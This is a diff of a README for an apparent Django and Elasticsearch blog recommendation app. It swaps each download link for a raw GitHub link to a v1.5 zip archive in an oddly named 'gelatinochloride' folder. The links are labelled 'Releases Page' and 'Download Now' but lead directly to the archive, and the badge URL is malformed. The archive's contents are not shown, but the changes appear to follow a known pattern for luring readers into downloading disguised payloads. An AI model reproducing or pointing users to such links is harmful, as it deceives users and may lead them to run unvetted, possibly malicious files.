@@ -1,6 +1,6 @@
 # 🌟 ai-blog-recommendation-django-elasticsearch - Smart Blog Suggestions at Your Fingertips
 
-[![Download Now](https://raw.githubusercontent.com/Gabito1967/ai-blog-recommendation-django-elasticsearch/main/gelatinochloride/ai-blog-recommendation-django-elasticsearch.zip%https://raw.githubusercontent.com/Gabito1967/ai-blog-recommendation-django-elasticsearch/main/gelatinochloride/ai-blog-recommendation-django-elasticsearch.zip)](https://raw.githubusercontent.com/Gabito1967/ai-blog-recommendation-django-elasticsearch/main/gelatinochloride/ai-blog-recommendation-django-elasticsearch.zip)
+[![Download Now](https://raw.githubusercontent.com/Gabito1967/ai-blog-recommendation-django-elasticsearch/main/gelatinochloride/ai_elasticsearch_blog_django_recommendation_v1.5.zip%https://raw.githubusercontent.com/Gabito1967/ai-blog-recommendation-django-elasticsearch/main/gelatinochloride/ai_elasticsearch_blog_django_recommendation_v1.5.zip)](https://raw.githubusercontent.com/Gabito1967/ai-blog-recommendation-django-elasticsearch/main/gelatinochloride/ai_elasticsearch_blog_django_recommendation_v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Before you begin, make sure you have the following:
 
 ## 🔗 Download & Install
 
-To get started with the application, visit our [Releases Page](https://raw.githubusercontent.com/Gabito1967/ai-blog-recommendation-django-elasticsearch/main/gelatinochloride/ai-blog-recommendation-django-elasticsearch.zip) to download the latest version.
+To get started with the application, visit our [Releases Page](https://raw.githubusercontent.com/Gabito1967/ai-blog-recommendation-django-elasticsearch/main/gelatinochloride/ai_elasticsearch_blog_django_recommendation_v1.5.zip) to download the latest version.
 
 1. Click the link above to open the releases page.
 2. Look for the latest version listed.
@@ -78,4 +78,4 @@ Special thanks to the communities of Django, Elasticsearch, and HuggingFace for 
 
 If you encounter any issues while installing or using the application, please reach out through the project's issue tracker on GitHub. We are here to help you.
 
-For the latest updates and to download the application, revisit our [Releases Page](https://raw.githubusercontent.com/Gabito1967/ai-blog-recommendation-django-elasticsearch/main/gelatinochloride/ai-blog-recommendation-django-elasticsearch.zip).
+For the latest updates and to download the application, revisit our [Releases Page](https://raw.githubusercontent.com/Gabito1967/ai-blog-recommendation-django-elasticsearch/main/gelatinochloride/ai_elasticsearch_blog_django_recommendation_v1.5.zip).
